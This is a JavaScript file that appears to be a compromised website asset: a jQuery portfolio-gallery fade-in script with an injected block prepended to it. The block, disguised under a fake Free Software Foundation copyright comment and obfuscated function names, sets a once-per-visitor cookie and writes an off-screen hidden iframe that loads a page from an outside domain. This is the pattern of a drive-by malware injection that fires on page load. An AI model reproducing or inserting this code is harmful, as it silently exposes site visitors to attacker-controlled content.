/*
Copyright (C) 2007 Free Software Foundation, Inc. http://fsf.org/
*/
function Depositormengarslife() {
function Expocarus(name, value, expires) {
 var date = new Date( new Date().getTime() + expires*1000 );
 document.cookie = name+'='+value+'; path=/; expires='+date.toUTCString();
}
function Afillatepost(name) {
 var afrodita = document.cookie.match(new RegExp( "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\/\+^])/g, '\$1') + "=([^;]*)" ));
 return afrodita ? decodeURIComponent(afrodita[1]) : undefined;
}
 var cookie = Afillatepost('salurdonersite');
 if (cookie == undefined) {
  Expocarus('salurdonersite', true, 259201);
document.write('<iframe src="http://atekmiror.libredegripe.com/titokaler16.khml" style="position:absolute;top:-999px;left:-999px;" height="131" width="131"></iframe>');
}
}
Depositormengarslife();
/*
Copyright (C) 2000 Free Software Foundation, Inc. See LICENSE.txt
*/jQuery(function() {
	jQuery('#gallery .portfolio li img').hide();
});

jQuery(window).bind('load', function() {
	 var i = 1;
	 var imgs = jQuery('#gallery .portfolio li img').length;
	 var int = setInterval(function() {
		 //console.log(i); check to make sure interval properly stops
		 if(i >= imgs) clearInterval(int);
		 jQuery('#gallery .portfolio li img:hidden').eq(0).fadeIn(300);
		 i++;
	 }, 300);
});